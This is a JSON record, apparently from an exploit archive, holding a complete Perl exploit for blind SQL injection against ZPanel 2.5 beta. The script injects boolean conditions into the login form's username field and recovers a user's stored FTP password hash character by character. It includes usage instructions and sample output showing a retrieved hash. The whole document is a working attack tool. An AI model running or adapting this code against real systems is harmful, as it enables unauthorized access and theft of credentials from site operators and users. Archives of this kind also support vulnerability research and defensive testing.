{
  "id": "996",
  "title": "ZPanel 2.5b10 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\n\r\n# ZPanel Ver. 2.5- Public BETA 2 (Release date: 1/15/2005)\r\n# sql injection exploit with one char bruteforce\r\n# work on all mysql versions \r\n\r\n# --------------------------------------------------------\r\n# example:\r\n# r57zpanel.pl http://192.168.0.1/zpanel/index.php admin\r\n# [~] PATH : http://192.168.0.1/zpanel/index.php\r\n# [~] USERNAME : admin\r\n# [~] SEARCHING PASSWORD ... [ DONE ]\r\n#\r\n# USER_NAME: admin\r\n#  FTP_PASS: 5f4dcc3b5aa765d61d8327deb882cf99\r\n# --------------------------------------------------------\r\n# bug found by foster\r\n# exploit coded by 1dt.w0lf\r\n# 02.04.05\r\n# http://ghc.ru\r\n# http://rst.void.ru\r\n\r\n$path     = $ARGV[0];\r\n$username = $ARGV[1];\r\n\r\n$s_num = 1;\r\n$|++;\r\n$n = 0;\r\n\r\nif (@ARGV < 2) { &usage; }\r\nprint \"[~] PATH : $path\\r\\n\";\r\nprint \"[~] USERNAME : $username\\r\\n\";\r\nprint \"[~] SEARCHING PASSWORD ... [|] [0]\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,122); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n if(length($allchar > 0)){\r\n print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n)).\" DONE ]     \"; \r\n print qq{\r\n USER_NAME: $username\r\n  FTP_PASS: $allchar\r\n };\r\n }\r\n else\r\n {\r\n print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n)).\" FAILED ]     \";\r\n }\r\n exit();  \r\n }\r\nelse \r\n {  \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \" BETWEEN $r AND $fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n status();\r\n $ccheck = $_[0];\r\n $username2 = $username.\"' AND ascii(substring(ftppass,\".$s_num.\",1))\".$ccheck.\" /*\";\r\n $mcb_reguest = LWP::UserAgent->new() or die;\r\n $res = $mcb_reguest->post($path,\r\n {\r\n \"uname\"  => \"$username2\",\r\n \"passwd\" => \"RST&GHC\",\r\n \"submit\" => \"Login\"\r\n }\r\n ); \r\n @results = $res->content; \r\n \r\n foreach $result(@results)\r\n  {\r\n  if ($result =~ /Incorrect password/) { return 1; }\r\n  }\r\n return 0;\r\n }\r\n \r\nsub status()\r\n{\r\n  $status = $n % 5;\r\n  if($status==0){ print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n-1)).\"/] [\".$n.\"]\";  }\r\n  if($status==1){ print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n-1)).\"-] [\".$n.\"]\";  }\r\n  if($status==2){ print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n-1)).\"\\\\] [\".$n.\"]\"; }\r\n  if($status==3){ print \"\\b\\b\\b\\b\\b\".\"\\b\"x(length($n-1)).\"|] [\".$n.\"]\";  }\r\n}\r\n\r\nsub usage()\r\n {\r\n print q(\r\n r57zpanel.pl - ZPanel ver 2.5-public beta 2 sql inj exploit\r\n -----------------------------------------------------------\r\n usage: r57zpanel.pl [path] [username]\r\n [path] - path to zpanel index\r\n [username] - username for bruteforce \r\n e.g.\r\n r57zpanel.pl http://192.168.0.1/zpanel/index.php admin\r\n -----------------------------------------------------------\r\n RST/GHC , http://rst.void.ru , http://ghc.ru\r\n );\r\n exit();\r\n }\r\n\r\n\r\n# milw0rm.com [2005-05-17]",
  "url": "https://www.exploit-db.com/exploits/996"
}